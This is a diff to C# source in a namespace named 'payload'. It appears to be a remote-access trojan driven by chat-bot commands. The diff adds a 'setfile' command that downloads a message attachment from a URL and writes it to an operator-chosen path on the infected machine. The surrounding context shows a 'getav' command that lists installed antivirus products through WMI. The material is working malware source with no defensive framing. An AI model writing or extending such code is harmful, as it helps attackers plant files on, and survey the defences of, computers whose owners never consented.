@@ -175,6 +175,16 @@ namespace payload
                         entrystream.Dispose();
                         break;
                     }
+                case "setfile":
+                    {
+                        var attachments = message.Attachments;
+                        if (attachments.Count < 1) break;
+                        string filepath = string.Join(" ", args);
+                        WebClient wc = new WebClient();
+                        wc.DownloadFile(attachments.ElementAt(0).Url, filepath);
+                        wc.Dispose();
+                        break;
+                    }
                 case "getav":
                     {
                         ManagementObjectSearcher searcher = new ManagementObjectSearcher($"\\\\{Environment.MachineName}\\root\\SecurityCenter2", "SELECT * FROM AntivirusProduct");
